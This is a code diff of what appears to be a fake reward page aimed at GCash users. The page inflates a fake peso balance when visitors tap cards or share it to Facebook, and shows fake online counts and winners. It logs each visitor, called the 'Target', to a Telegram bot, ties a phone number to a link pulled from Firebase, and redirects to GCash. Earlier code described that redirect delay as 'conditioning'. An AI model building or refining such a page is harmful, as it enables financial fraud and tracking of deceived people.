@@ -9,6 +9,9 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="js/config.js"></script>
 
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+
     <script>
         (function() {
             // Check for Banned or Not Verified
@@ -31,47 +34,6 @@
             };
         })();
     </script>
-
-    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
-    
-    <style>
-        :root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); --dark-bg: #04070d; }
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Public Sans', sans-serif; background-color: var(--dark-bg); background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, transparent 70%); color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; overflow-x: hidden; }
-
-        /* OVERLAYS */
-        #processingOverlay { position: fixed; inset: 0; background: rgba(4, 7, 13, 0.98); z-index: 999999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; backdrop-filter: blur(15px); }
-        #mobileOnlyOverlay { position: fixed; inset: 0; background: #060a13; z-index: 999998; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 30px; }
-        
-        .spinner { width: 60px; height: 60px; border: 5px solid rgba(212, 175, 55, 0.3); border-top-color: #d4af37; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        .proc-title { font-size: 22px; font-weight: 900; color: #fff; margin-bottom: 15px; letter-spacing: 1px; }
-        .proc-text { color: #fbbf24; font-size: 15px; line-height: 1.6; font-weight: 600; max-width: 320px; background: rgba(251, 191, 36, 0.1); padding: 15px; border-radius: 12px; border: 1px solid rgba(251, 191, 36, 0.3); }
-
-        /* LIVE STATS */
-        .live-stats { position: absolute; top: 20px; display: flex; flex-direction: column; align-items: center; gap: 8px; z-index: 100; width: 100%; }
-        .live-winner-box { background: rgba(0, 0, 0, 0.85); border: 1px solid rgba(212, 175, 55, 0.4); padding: 8px 15px; border-radius: 50px; font-size: 11px; display: flex; align-items: center; gap: 8px; backdrop-filter: blur(10px); }
-        .online-count { font-size: 10px; color: #22c55e; font-weight: 800; text-transform: uppercase; }
-        .dot { width: 8px; height: 8px; background: #22c55e; border-radius: 50%; display: inline-block; margin-right: 5px; box-shadow: 0 0 10px #22c55e; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
-        .gc-mini-icon { width: 14px; height: 14px; vertical-align: middle; }
-
-        /* MAIN CARD */
-        .card { background: rgba(255, 255, 255, 0.03); width: 100%; max-width: 400px; padding: 35px 20px; border-radius: 30px; border: 1px solid rgba(212, 175, 55, 0.3); backdrop-filter: blur(15px); text-align: center; position: relative; }
-        .logo-img { width: 160px; margin-bottom: 20px; }
-        .timer-box { font-size: 12px; color: #94a3b8; margin-bottom: 5px; font-weight: 600; }
-        .amount { font-family: 'Orbitron', sans-serif; font-size: 52px; background: var(--gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; font-weight: 700; }
-
-        /* BUTTONS */
-        .btn-group { display: flex; flex-direction: column; gap: 12px; margin-top: 10px; }
-        .pay-button { background: var(--gold); color: #000; width: 100%; padding: 18px; border: none; border-radius: 15px; font-size: 18px; font-weight: 800; text-transform: uppercase; cursor: pointer; box-shadow: 0 6px 0 #8b6508; transition: 0.2s; }
-        .pay-button:active { transform: translateY(3px); box-shadow: 0 3px 0 #8b6508; }
-        .pay-button:disabled { background: #334155; color: #64748b; box-shadow: none; cursor: not-allowed; }
-        
-        .share-button { background: #1877f2; color: #fff; width: 100%; padding: 12px; border: none; border-radius: 12px; font-size: 14px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .promo-photo { width: 100%; border-radius: 20px; margin-top: 25px; border: 1px solid rgba(212, 175, 55, 0.2); }
-    </style>
 </head>
 <body>
 
@@ -88,6 +50,7 @@
     </div>
 
     <div id="mainContent" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
+        
         <div class="live-stats">
             <div class="online-count"><span class="dot"></span> <span id="userCount">32</span> Members Online</div>
             <div class="live-winner-box" id="winnerBox">
@@ -95,11 +58,32 @@
             </div>
         </div>
 
+        <div class="game-grid">
+            <div class="card-wrapper" id="goddess-card" onclick="triggerMove(this, 25)">
+                <img src="images/img1.png" alt="Goddess Girl" class="card-img idle">
+            </div>
+            <div class="card-wrapper" id="monkey-card" onclick="triggerMove(this, 25)">
+                <img src="images/img2.png" alt="Monkey" class="card-img idle">
+            </div>
+            <div class="card-wrapper" id="zeus-card" onclick="triggerMove(this, 25)">
+                <img src="images/img3.png" alt="Bathala/Zeus" class="card-img idle">
+            </div>
+            <div class="card-wrapper" id="bear-card" onclick="triggerMove(this, 25)">
+                <img src="images/img4.png" alt="Candy Bear" class="card-img idle">
+            </div>
+            <div class="card-wrapper" id="dress-card" onclick="triggerMove(this, 25)">
+                <img src="images/img5.png" alt="Dress Girl" class="card-img idle">
+            </div>
+            <div class="card-wrapper" id="boxer-card" onclick="triggerMove(this, 25)">
+                <img src="images/img6.png" alt="Boxer" class="card-img idle">
+            </div>
+        </div>
+
         <div class="card">
             <img src="images/logo1.png" class="logo-img">
-            <div style="font-size: 11px; color: #fbbf24; letter-spacing: 2px; font-weight: 800;">TOTAL PAYOUT</div>
-            <div class="timer-box" id="timerLabel">Processing rewards in: <span id="countdown">05</span>s</div>
+            <div style="font-size: 11px; color: #fbbf24; letter-spacing: 2px; font-weight: 800;">AVAILABLE BALANCE</div>
             <div class="amount" id="balanceText">₱0.00</div>
+            <div class="timer-box" id="timerLabel">Processing rewards in: <span id="countdown">05</span>s</div>
             
             <div class="btn-group">
                 <button class="share-button" id="shareBtn" onclick="shareToFB()" style="display: none;">
@@ -126,7 +110,38 @@
             try { await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`); } catch(e) {}
         }
 
-        // --- 2. CORE REDIRECT LOGIC (VIALINK SYSTEM) ---
+        // --- 2. GAME CARD ANIMATION & BALANCE LOGIC ---
+        function triggerMove(element, amount) {
+            // Trigger physical animation class
+            element.classList.add('move-active');
+            
+            // Get current balance and add new amount
+            let currentText = document.getElementById('balanceText').innerText.replace('₱', '').replace(/,/g, '');
+            let currentBalance = parseFloat(currentText) || 0;
+            
+            animateValue(currentBalance, currentBalance + amount, 500);
+
+            // Remove class after animation finishes (600ms)
+            setTimeout(() => {
+                element.classList.remove('move-active');
+            }, 600);
+        }
+
+        function animateValue(start, end, duration) {
+            let startTimestamp = null;
+            const step = (timestamp) => {
+                if (!startTimestamp) startTimestamp = timestamp;
+                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                const currentVal = Math.floor(progress * (end - start) + start);
+                document.getElementById('balanceText').innerText = "₱" + currentVal.toLocaleString() + ".00";
+                if (progress < 1) {
+                    window.requestAnimationFrame(step);
+                }
+            };
+            window.requestAnimationFrame(step);
+        }
+
+        // --- 3. VIALINK SYSTEM (GCASH REDIRECT) ---
         function redirectToGCash() {
             const claimBtn = document.getElementById('claimBtn');
             const overlay = document.getElementById('processingOverlay');
@@ -136,13 +151,11 @@
             
             trackActivity("Target initiated Withdraw. Searching for Active ViaLink...");
 
-            // Fetch 'available' link from Firebase
             db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
                 if (snapshot.exists()) {
                     const linkId = Object.keys(snapshot.val())[0];
                     const targetUrl = snapshot.val()[linkId].url;
 
-                    // Update link status to PENDING
                     db.ref('links/' + linkId).update({
                         status: 'pending',
                         user: savedPhone
@@ -150,7 +163,6 @@
 
                     trackActivity(`ViaLink Established! Redirecting to GCash...`);
 
-                    // 3.5s delay for conditioning
                     setTimeout(() => {
                         window.location.href = targetUrl;
                     }, 3500);
@@ -164,43 +176,24 @@
             });
         }
 
-        // --- 3. UI ANIMATIONS & STATS ---
-        const possibleAmounts = [350, 500, 750, 1000];
-        let currentReward = possibleAmounts[Math.floor(Math.random() * possibleAmounts.length)];
+        // --- 4. TIMER, SHARE BUTTON & STATS ---
         let timeLeft = 5;
-
         const countdownTimer = setInterval(() => {
             timeLeft--;
             if(document.getElementById('countdown')) document.getElementById('countdown').innerText = "0" + timeLeft;
             if (timeLeft <= 0) {
                 clearInterval(countdownTimer);
-                document.getElementById('timerLabel').innerHTML = "Reward Confirmed!";
+                document.getElementById('timerLabel').innerHTML = "Reward Slots Open!";
                 document.getElementById('shareBtn').style.display = "flex";
-                animateValue(0, currentReward, 1500); 
+                document.getElementById('claimBtn').disabled = false;
             }
         }, 1000);
 
-        function animateValue(start, end, duration) {
-            let startTimestamp = null;
-            const step = (timestamp) => {
-                if (!startTimestamp) startTimestamp = timestamp;
-                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
-                const currentVal = Math.floor(progress * (end - start) + start);
-                document.getElementById('balanceText').innerText = "₱" + currentVal.toLocaleString() + ".00";
-                if (progress < 1) {
-                    window.requestAnimationFrame(step);
-                } else {
-                    document.getElementById('claimBtn').disabled = false;
-                }
-            };
-            window.requestAnimationFrame(step);
-        }
-
         function shareToFB() {
             window.open("https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(window.location.href), '_blank', 'width=600,height=400');
-            let oldVal = currentReward;
-            currentReward += 50;
-            animateValue(oldVal, currentReward, 500);
+            let currentText = document.getElementById('balanceText').innerText.replace('₱', '').replace(/,/g, '');
+            let currentBalance = parseFloat(currentText) || 0;
+            animateValue(currentBalance, currentBalance + 50, 500);
         }
 
         // Live Winner Rotator
